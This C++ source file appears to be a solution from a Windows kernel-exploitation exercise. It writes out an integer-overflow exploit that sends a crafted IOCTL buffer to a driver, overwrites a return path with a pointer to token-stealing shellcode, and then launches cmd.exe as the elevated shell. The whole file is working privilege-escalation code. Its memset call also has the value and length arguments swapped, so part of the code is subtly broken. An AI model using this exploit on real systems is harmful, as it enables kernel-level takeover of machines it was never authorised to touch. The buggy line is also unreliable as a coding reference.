#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "ioctal_codes.h"
#include "random_str.h"
#include "utils.h"

NTSTATUS Solutions::TriggerIntegerOverflow() {
	DWORD dwBufSize = 0x828;
	DWORD lTerminatorValue = 0xBAD0B0B0;
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_INTEGER_OVERFLOW;
	DWORD dwBytesReturned = NULL;
	PVOID pEopPayload = &token_stealing_shellcode;

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize + sizeof(PULONG) * 2);
	if (!lpInBuffer) {
		std::cout << "[-] Could not allocate buffer :(" << std::endl;
		return 1;
	}

	memset(lpInBuffer, dwBufSize, 0x41);
	*(PULONG)(lpInBuffer + dwBufSize) = (ULONG)pEopPayload;
	*(PULONG)(lpInBuffer + dwBufSize + 4) = lTerminatorValue;

	std::cout << "[+] Prepering to jump to shellcode - " << std::hex << (ULONG)pEopPayload << std::endl;

	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
		NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] Could not talk with the driver - " << GetLastError() << std::endl;
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	std::cout << "[+] Succesfully talked with the driver" << std::endl;

	system("cmd.exe");

	return 0;
}

